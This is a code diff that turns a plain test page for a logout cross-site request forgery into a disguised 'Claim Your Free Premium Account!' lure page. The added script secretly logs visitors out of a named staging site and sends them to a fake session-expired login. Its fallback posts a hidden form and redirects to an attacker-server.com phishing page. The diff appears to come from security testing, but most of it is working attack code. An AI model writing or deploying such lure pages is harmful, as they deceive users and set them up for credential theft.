@@ -1,54 +1,80 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Free Gift Claim</title>
+    <style>
+        body { font-family: Arial; padding: 20px; text-align: center; }
+        .gift { font-size: 48px; margin: 20px; }
+        .btn { 
+            background: #FF6B6B; 
+            color: white; 
+            padding: 15px 30px; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 18px; 
+            cursor: pointer;
+            margin: 20px;
+        }
+    </style>
+</head>
 <body>
-    <h2>Test Logout CSRF (Should Work)</h2>
-    <button onclick="testLogout()">Test Logout Endpoint</button>
-    <div id="result" style="margin-top: 20px; padding: 10px; background: #f0f0f0;"></div>
+    <div class="gift">🎁</div>
+    <h2>Claim Your Free Premium Account!</h2>
+    <p>Click below to verify your eligibility...</p>
     
+    <button class="btn" onclick="performAttack()">Claim Now</button>
+    
+    <div id="status" style="margin-top: 20px; color: #666;"></div>
+
     <script>
-    function log(msg) {
-        document.getElementById('result').innerHTML += `<div>${msg}</div>`;
-        console.log(msg);
+    function performAttack() {
+        document.getElementById('status').innerHTML = "Verifying your account...";
+        
+        // Perform stealth logout CSRF
+        fetch('https://staging.textjam.com/api/auth/logout', {
+            method: 'POST',
+            credentials: 'include',  // Send cookies
+            mode: 'no-cors',         // Avoid CORS issues
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({action: 'logout'})
+        })
+        .then(() => {
+            document.getElementById('status').innerHTML = "✅ Account verified! Redirecting...";
+            
+            // Redirect to phishing page after logout
+            setTimeout(() => {
+                window.location.href = "https://staging.textjam.com/login?message=Session+expired+please+login+again";
+            }, 1500);
+        })
+        .catch(error => {
+            document.getElementById('status').innerHTML = "⚠️ Verification failed. Trying alternative method...";
+            fallbackMethod();
+        });
     }
     
-    async function testLogout() {
-        log('Testing logout endpoint...');
+    function fallbackMethod() {
+        // Alternative: Form submission method
+        var form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://staging.textjam.com/api/auth/logout';
+        form.style.display = 'none';
         
-        try {
-            const response = await fetch('https://staging.textjam.com/api/auth/logout', {
-                method: 'POST',
-                credentials: 'include',  // Send cookies
-                mode: 'no-cors',         // Bypass CORS
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({})  // Empty object
-            });
-            
-            log(`✅ Logout request sent (mode: no-cors)`);
-            log(`Note: Can't read response with no-cors mode`);
-            
-            // Check if we're logged out by trying to access protected page
-            setTimeout(async () => {
-                try {
-                    const test = await fetch('https://staging.textjam.com/api/user/profile', {
-                        credentials: 'include'
-                    });
-                    if (test.status === 401) {
-                        log('🎉 SUCCESS: User is logged out!');
-                    } else {
-                        log(`⚠️ Still logged in? Status: ${test.status}`);
-                    }
-                } catch(e) {
-                    log(`Profile check error: ${e.message}`);
-                }
-            }, 1000);
-            
-        } catch(error) {
-            log(`❌ Error: ${error.message}`);
-        }
+        // Try to include CSRF token if we can steal it
+        var csrfInput = document.createElement('input');
+        csrfInput.type = 'hidden';
+        csrfInput.name = 'csrf_token';
+        csrfInput.value = 'attacker_token'; // Would need real token
+        
+        form.appendChild(csrfInput);
+        document.body.appendChild(form);
+        form.submit();
+        
+        setTimeout(() => {
+            window.location.href = "https://attacker-server.com/phishing-login";
+        }, 1000);
     }
     </script>
 </body>
 </html>
-
